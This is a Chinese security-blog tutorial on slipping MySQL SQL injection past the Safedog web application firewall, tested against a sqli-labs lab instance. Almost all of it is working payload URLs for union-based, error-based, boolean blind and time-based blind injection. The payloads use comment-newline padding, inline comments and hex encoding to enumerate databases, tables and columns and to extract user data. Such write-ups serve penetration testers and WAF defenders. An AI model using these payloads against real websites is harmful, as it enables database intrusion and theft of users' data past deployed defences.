# Bypass MySQL Safedog

阅读量 **852175**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-10-18 14:30:30

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0136a9bfa315469964.jpg)

跟团队小伙伴一起日狗

## 判断注入

安全狗不让基本运算符后跟数字字符串

特殊运算符绕

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'and> -1=-1 -- + 正常
    <http://172.16.1.157/sql/Less-1/?id=1'and> -1=-2 -- + 不正常
    <http://172.16.1.157/sql/Less-1/?id=1'and> ~1=~1 -- + 正常
    <http://172.16.1.157/sql/Less-1/?id=1'and> ~1=~2 -- + 不正常

16进制绕

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and 0x0 <> 0x1-- +    正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and 0x0 <> 0x0-- +    不正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and 0x0 <=> 0x0-- +   正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and 0x0 <=> 0x1-- +   不正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and 0x0 xor 0x1-- +   正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and 0x0 xor 0x0-- +   不正常

BINARY绕

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and BINARY 1-- +  正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and BINARY 0-- +  不正常

conv()函数绕

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and CONV(1,11,2)-- +  正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and CONV(0,11,2)-- +  不正常

concat()函数绕

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and CONCAT(1)-- +     正常
    <http://172.16.1.157/sql/Less-1/?id=1'> and CONCAT(0)-- +     不正常

## 判断字段数

绕order by

内联

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'/*!14440order> by*/ 3 -- +

注释换行

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'order%23%0aby> 3 -- +

## 联合查询

关键在于打乱union select

内联

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> /*!14440union*//*!14440select */1,2,3 -- +

注释后跟垃圾字符换行

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'union%23hhh%0aselect> 1,2,3--+

union distinct | distinctrow | all

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union distinct %23%0aselect 1,2,3 -- +
    <http://172.16.1.157/sql/Less-1/?id=-1'> union distinctrow %23%0aselect 1,2,3 -- +
    <http://172.16.1.157/sql/Less-1/?id=-1'> union all%23%0aselect 1,2,3 -- +

接下来是查数据，我在这使用注释垃圾字符换行也就是%23a%0a的方法来绕，你可以用上面说的/*!14440*/内联

查当前数据库名

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23chabug%0a select 1,database%23%0a(%0a),3 -- +

查其他库名 安全狗4.0默认没开information_schema防护的时候可以过，开了information_schema防护之后绕不过去，哭唧唧😭

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23asdasdasd%0a select 1,(select schema_name from %23%0ainformation_schema.schemata  limit 1,1),3 -- +

查表名

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23asdasdasd%0a select 1,(select table_name from %23%0ainformation_schema.tables where table_schema=database(%23%0a) limit 1,1),3 -- +

查列名，首先是没开information_schema防护时

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23a%0a select 1,(select column_name from %23%0a information_schema.columns where table_name=0x7573657273 and%23a%0a table_schema=database(%23%0a) limit 1,1),3 -- +

开information_schema防护有两种姿势，不过需要知道表名

一、子查询

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23a%0a SELECT 1,2,x.2 from %23a%0a(SELECT * from %23a%0a (SELECT 1)a, (SELECT 2)b union  %23a%0aSELECT *from  %23a%0aemails)x limit 2,1 -- +

二、用join和using爆列名，前提是页面可以报错，需要已知表名

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23a%0aSELECT 1,2,(select * from %23a%0a(select * from %23a%0aemails a join emails b) c) -- +

![](https://p4.ssl.qhimg.com/dm/1024_549_/t01944e8970418e8b83.png)

然后通过using来继续爆

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23a%0aSELECT 1,2,(select * from %23a%0a(select * from %23a%0aemails a join emails b using(id)) c) -- +

![](https://p3.ssl.qhimg.com/dm/1024_549_/t011ec2e75861741f68.png)

查数据

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> union %23a%0aSELECT 1,2,(select email_id from%23a%0a emails limit 1,1) -- +

其实配合MySQL5.7的特性可以使用sys这个库来绕过，具体看chabug发的文章吧
[注入bypass之捶狗开锁破盾](https://www.chabug.org/web/1019.html)

> 在下文中不再提及开启information_schema防护的绕过姿势，自行举一反三。

## 报错注入

报错注入只提及updatexml报错

关键在于updatexml()结构打乱

    
    
    and updatexml(1,1,1     不拦截
    and updatexml(1,1,1)    拦截

不让updatexml匹配到两个括号就行了

用户名 库名

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> and updatexml(1,concat(0x7e,user(/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
    <http://172.16.1.157/sql/Less-1/?id=-1'> and updatexml(1,concat(0x7e,database(/*!)*/,0x7e/*!)*/,1/*!)*/ -- +

库名

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> and updatexml(1,`concat`(0x7e,(select schema_name from %23a%0a information_schema.schemata  limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +

表名

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> and updatexml(1,`concat`(0x7e,(select table_name from %23a%0a information_schema.tables where table_schema=database(/*!)*/ limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +

列名

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> and updatexml(1,`concat`(0x7e,(select column_name from %23a%0a information_schema.columns where table_schema=database(/*!)*/ and %23a%0atable_name=0x7573657273 limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +

查数据

    
    
    <http://172.16.1.157/sql/Less-1/?id=-1'> and updatexml(1,concat(0x7e,(select email_id from %23a%0a emails limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +

## 盲注

分布尔盲注和时间盲注来说吧

### 布尔盲注

不让他匹配完整括号对

使用left()或者right()

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and hex(LEFT(user(/*!)*/,1))=%23a%0a72 -- +
    <http://172.16.1.157/sql/Less-1/?id=1'> and hex(right(user(/*!)*/,1))=%23a%0a72 -- +

使用substring() substr()

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and hex(SUBSTRING(user(/*!)*/,1,1))=72 -- +
    <http://172.16.1.157/sql/Less-1/?id=1'> and hex(substr(user(/*!)*/,1,1))=72 -- +

查表名

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and hex(SUBSTR((select table_name from %23a%0a information_schema.tables where table_schema=%23a%0adatabase%23a%0a(/*!)*/ limit 0,1),1,1))=65-- +

列名字段名同理，略

### 时间盲注

不匹配成对括号

sleep()绕过

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and sleep(3/*!)*/-- +

查用户

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'>  and if%23%0a(left(user(/*!)*/,1/*!)*/=char(114),sleep(3/*!)*/,1/*!)*/ -- +
    <http://172.16.1.157/sql/Less-1/?id=1'>  and if%23%0a(left(user(/*!)*/,1/*!)*/=0x72,sleep(3/*!)*/,1/*!)*/ -- +

查数据 limit过不了

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'>  and if%23%0a(left((select group_concat(table_name/*!)*/ from%23a%0ainformation_schema.tables where table_schema=database(/*!)*/ /*!)*/,1/*!)*/=0x65,sleep(5/*!)*/,1/*!)*/ -- +

## 其他

length()长度

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'> and length(1)<=>1 -- +
    <http://172.16.1.157/sql/Less-1/?id=1'>  and length(database(/*!))*/<=>8 -- +

count()

    
    
    <http://172.16.1.157/sql/Less-1/?id=1'>  and  (%23a%0aselect count(password/*!)*/ from %23a%0a users/*!)*/<=>13 -- +

## 参考

<https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI>

<https://www.chabug.org/web/1019.html>

文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Y4er** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/188465](/post/id/188465)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [waf](/tag/waf)

 **+1** __21赞

 __收藏

![](https://p2.ssl.qhimg.com/t01c94cbc6f6c004042.png) Y4er

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

